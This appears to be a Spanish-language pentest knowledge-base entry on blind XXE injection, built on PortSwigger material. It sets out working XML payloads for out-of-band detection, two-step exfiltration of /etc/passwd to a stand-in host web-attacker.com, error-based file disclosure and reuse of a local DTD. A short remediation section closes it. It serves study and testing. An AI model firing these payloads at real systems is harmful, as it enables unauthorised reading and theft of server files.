---
clase: inyeccion
tech: xml-parsers
cwe: CWE-611
cvss: 8.6 # [derivado] exfiltracion de ficheros sin canal visible
payload: |
  # ---- DETECCION CIEGA con entidad normal - LITERAL de la fuente ----
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
  #
  # ---- Si las entidades normales estan bloqueadas: ENTIDADES DE PARAMETRO ----
  # Declaracion y referencia - LITERALES de la fuente:
  <!ENTITY % myparameterentity "my parameter entity value" >
  %myparameterentity;
  # Deteccion ciega con entidad de parametro - LITERAL:
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
  #
  # ---- EXFILTRACION OOB EN DOS PASOS ----
  # Paso 1: alojar un DTD en http://web-attacker.com/malicious.dtd con este contenido
  # LITERAL de la fuente:
  <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;
  # Paso 2: payload enviado al objetivo - LITERAL:
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
  #
  # El '&#x25;' es un '%' codificado: hace falta porque el '%' dentro de una entidad
  # debe escaparse para que se expanda en el momento correcto.
  #
  # LIMITACION LITERAL de la fuente: la exfiltracion de /etc/passwd por HTTP puede
  # fallar por los saltos de linea; sugiere FTP o un fichero como /etc/hostname.
  #
  # ---- VARIANTE BASADA EN ERRORES - DTD LITERAL de la fuente ----
  <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
  # Mensaje de error resultante - LITERAL (el '...' es de la fuente):
  #   java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...
  #
  # ---- REUTILIZAR UN DTD LOCAL (cuando no hay salida de red) ----
  # Sonda para descubrir que DTD locales existen - LITERAL:
  <!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
  # Payload hibrido con DTD interno - LITERAL:
  <!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
precondicion: "Parser XML que resuelve entidades externas pero NO refleja su valor en la respuesta. La variante OOB requiere salida de red desde el servidor. La variante basada en errores requiere que los mensajes de error lleguen al cliente. La variante de DTD local NO requiere ninguna de las dos: funciona sin salida de red y sin errores visibles, reutilizando un fichero DTD que ya existe en el sistema."
como_se_descubre: |
  Escalera de tres peldaños, de mas a menos requisitos:
  1. OOB: entidad externa a un dominio propio. Una consulta DNS mas una peticion HTTP
     confirman la interaccion. Requiere salida de red.
  2. BASADA EN ERRORES: si no hay salida de red pero los errores se filtran, meter el
     contenido del fichero en una RUTA INEXISTENTE y leerlo en el mensaje de
     FileNotFoundException. El error hace el trabajo del canal.
  3. DTD LOCAL: si no hay ni salida de red ni errores utiles, reutilizar un DTD que ya
     este en el disco. Sonda literal de la fuente: un DTD AUSENTE produce error, asi
     que se puede ENUMERAR que ficheros DTD existen probandolos uno a uno.
  Ese tercer peldaño es el mas elegante del conjunto: convierte la ausencia de canal en
  un canal, usando los errores de parseo como oraculo de existencia de ficheros.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: entidad externa a un dominio propio -> llega consulta DNS Y peticion HTTP
  # B: entidad externa a un dominio que NO existe -> solo consulta DNS fallida
  # El par A/B distingue 'el parser resuelve y conecta' de 'el parser solo resuelve
  # DNS'. Es la misma distincion del writeup de SSRF: resolucion no es conexion, y si
  # solo llega el DNS la exfiltracion por HTTP no funcionara.
  # C: para la variante de DTD local, probar una ruta DTD que SE SABE inexistente
  #    -> error distinto. Calibra el oraculo antes de enumerar.
mata: |
  - Resolucion de entidades externas deshabilitada -> mueren las tres variantes.
  - Sin salida de red Y sin errores visibles -> solo queda la via del DTD local.
  - La exfiltracion falla por saltos de linea en el fichero (advertencia LITERAL de la
    fuente). Usar FTP, o un fichero de una sola linea como /etc/hostname.
  - En B solo llega DNS y no HTTP -> no habra exfiltracion por HTTP.
fuente: "https://portswigger.net/web-security/xxe/blind. Todos los DTD y payloads literales de la pagina. Los '...' en el mensaje de error son de la propia fuente. La fuente nombra Burp Collaborator para observar las interacciones."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] XXE ciega — OOB, basada en errores, y reutilizar un DTD que ya está en el disco

## Principio
Cuando el parser resuelve entidades pero no refleja su valor, hace falta un canal
alternativo. Hay tres, y la gracia está en que **cada uno necesita menos del objetivo que
el anterior**.

## 1 — Out-of-band (requiere salida de red)
Detección:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Si las entidades normales están bloqueadas, entidades de parámetro:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Exfiltración, con el DTD alojado por el atacante:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;
```

Y el payload que lo trae:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

El `&#x25;` es un `%` codificado, necesario para que la expansión ocurra en el momento
correcto y no antes. Es el detalle que más intentos arruina.

Limitación literal de la fuente: exfiltrar `/etc/passwd` por HTTP puede fallar por los
**saltos de línea**; sugiere FTP o un fichero de una sola línea como `/etc/hostname`.

## 2 — Basada en errores (requiere errores visibles)
Si no hay salida de red pero los mensajes de error llegan al cliente, se mete el
contenido del fichero en una **ruta inexistente** y se lee en la excepción:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

→ `java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:...`

El error hace el trabajo del canal. Es el mismo principio que la extracción SQL por
mensajes de error: provocar que el sistema recite el dato al quejarse.

## 3 — Reutilizar un DTD local (no requiere nada)
La variante más elegante del conjunto. Sin salida de red y sin errores útiles, se
reutiliza un DTD que **ya existe en el disco**:

```xml
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```

Y el payload híbrido que redefine una entidad del DTD local:

```xml
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```

Lo brillante es el paso previo: **un DTD ausente produce un error distinto**, así que se
puede *enumerar qué ficheros DTD existen* probándolos uno a uno. La ausencia de canal se
convierte en canal, usando los errores de parseo como oráculo de existencia de ficheros.

## El control que separa DNS de conexión
Apuntar a un dominio propio y comprobar si llega **solo la consulta DNS** o también la
petición HTTP. Es la misma distinción que en el writeup de SSRF y por la misma razón: si
solo llega el DNS, el parser resuelve nombres pero no establece conexiones, y la
exfiltración por HTTP no va a funcionar por mucho que se insista.

## Impacto
Exfiltración de ficheros arbitrarios del servidor sin ningún canal visible en la
respuesta. La variante del DTD local funciona en entornos que se consideran protegidos
precisamente por no tener salida de red.

## Remediación
La misma que el XXE visible: deshabilitar la resolución de entidades externas **y** el
soporte de XInclude. Ninguna de las tres variantes sobrevive a eso.
